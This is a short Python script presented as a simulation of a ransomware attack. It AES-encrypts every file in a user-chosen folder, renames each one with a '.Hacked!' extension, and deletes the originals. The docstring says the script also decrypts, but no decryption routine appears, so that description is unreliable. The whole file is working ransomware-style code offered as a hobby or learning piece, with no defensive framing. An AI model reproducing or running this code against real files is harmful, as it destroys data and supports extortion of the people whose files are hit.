"""

Simple script to simulate the procedure of a Ransomware attack
The script encrypts and decrypts target files'

"""""
_author_ = "Victor Marquez"
_version_ =0.3

import os
from pathlib import Path
from Crypto.Cipher import AES


def detectFiles(mainPath):
    for entry in os.scandir(mainPath):
        if entry.is_file():
            yield entry

def encryptFile(file, Pkey,Path):
    #Read file
    dataFIle = file
    with open(dataFIle, 'rb') as f:
        data = f.read()

    #Convert data to byte
    dataByte = bytes(data)


    #Encrypt the data with the key
    cipher = AES.new(Pkey, AES.MODE_EAX)
    chiphertext, tag = cipher.encrypt_and_digest(dataByte)

    #Save data
    fileName = file.name.removesuffix(file.suffix)
    fileExtension = ".Hacked!"
    encFile = Path+"/"+fileName + fileExtension
    with open(encFile, 'wb') as f:
        [f.write(x) for x in (cipher.nonce,tag,chiphertext)]
        f.close()
        os.remove(file)

#Setting up key for encryption
print("Please insert the key:     {Note, make sure it is 16 characters long}")
key = bytes(input(),encoding='utf_8')

#Target Folder where files will be encrypted
print("Please enter the path where files will be encrypted")
path = input()

for file in detectFiles(path):
    filePath = Path(file)
    encryptFile(filePath,key,path)

print("The files have been encrypted!")
input()
